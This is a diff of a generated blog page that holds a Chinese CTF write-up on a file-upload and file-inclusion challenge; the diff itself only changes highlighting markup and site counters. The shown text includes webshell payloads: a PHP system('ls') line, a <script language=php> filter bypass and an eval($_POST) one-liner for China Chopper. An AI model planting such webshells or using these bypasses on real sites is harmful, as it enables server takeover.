@@ -528,14 +528,14 @@
 <br>
 只能上传图片，对大小有限制，那么上传个图片马
 
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> system(<span class="string">"ls"</span>); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php <span class="keyword">system</span>(<span class="string">"ls"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>上传后提示:<br><img src="https://i.imgur.com/tr8R2S4.png" alt></p>
 <p>那么就访问upload/201808170638381043.jpg<br>构造url<br><a href="http://118.89.219.210:49166/index.php?file=upload/201808170638381043.jpg" target="_blank" rel="noopener">http://118.89.219.210:49166/index.php?file=upload/201808170638381043.jpg</a></p>
 <p>发现后台把<code>&lt;?php</code>,<code>?&gt;</code>替换成了<code>_</code>,<code>_</code><br><img src="https://i.imgur.com/UP3KLHo.png" style="float:left;"></p>
 <br>
 那么用`<script>`标签绕过
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">langulage</span>=<span class="string">php</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">system(<span class="string">"ls"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">langulage</span>=<span class="string">php</span>&gt;</span></span><br><span class="line"><span class="actionscript">system(<span class="string">"ls"</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>再次上传，并打开文件所在地址</p>
 <p>发现解析成功</p>
@@ -548,7 +548,7 @@
 <p><font size=4 color=darkred>这种方法是上传木马后利用中国菜刀</font></p>
 </blockquote>
 <p>有了上一次的经验，这里直接:<br>文件名 1.php;.jpg<br>内容:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">echo <span class="string">'aaaa'</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">'aaaa'</span>]);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span></span><br><span class="line"><span class="actionscript">echo <span class="string">'aaaa'</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">'aaaa'</span>]);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>上传后访问<br><a href="http://118.89.219.210:49166/index.php?file=upload/201808170651501676.jpg">http://118.89.219.210:49166/index.php?file=upload/201808170651501676.jpg</a></p>
 <p>发现成功显示了 aaaa</p>
@@ -743,7 +743,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -765,7 +765,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">80</span>
+                  <span class="site-state-item-count">83</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -925,7 +925,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">42.9k</span>
+    <span title="Site words total count">43.4k</span>
   
 </div>
 
